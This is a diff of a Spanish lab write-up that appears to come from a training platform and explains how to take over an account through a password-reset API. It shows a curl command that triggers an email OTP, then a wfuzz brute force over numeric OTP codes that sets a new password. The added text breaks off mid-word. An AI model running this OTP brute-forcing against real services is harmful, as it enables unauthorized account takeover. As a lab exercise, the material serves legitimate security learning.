@@ -22,11 +22,13 @@ Tenemos a nuestra disposición otro método de la API, que permite el envío de 
 
 ![api_otp](img/reset_password_1.png)
 
+Realizamos la petición de restablecimiento de contraseña, para que se genere la clave OTP.
 ```bash
 # curl -X 'POST' 'http://94.237.60.154:52829/api/v1/authentication/customers/passwords/resets/email-otps' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"Email": "MasonJenkins@ymail.com"}'
 {"SuccessStatus":true}
 ```
 
+No es difícil encontrar mecanismos OTP que devuelven contraseñas de entre 4 a 6 carácteres, todos numéricos. A continuzación, realizamos nuestro ataque de fuerza bruta con wfuzz. Con el parámetro "--hh" ocultamos las peticiones fallidas, que devuelven "SuccessStatus: false". 
 ```bash
 # wfuzz -c --hh 23  --hc 404 -u http://94.237.60.154:52829/api/v1/authentication/customers/passwords/resets -z range,1-9999 -H "Content-Type: application/json" -d '{"Email": "MasonJenkins@ymail.com", "NewPassword": "Test1234", "OTP":"FUZZ"}'
 ********************************************************
@@ -47,6 +49,7 @@ Filtered Requests: 9998
 Requests/sec.: 193.1555
 
 ```
+Como puedes obser
 
 
 
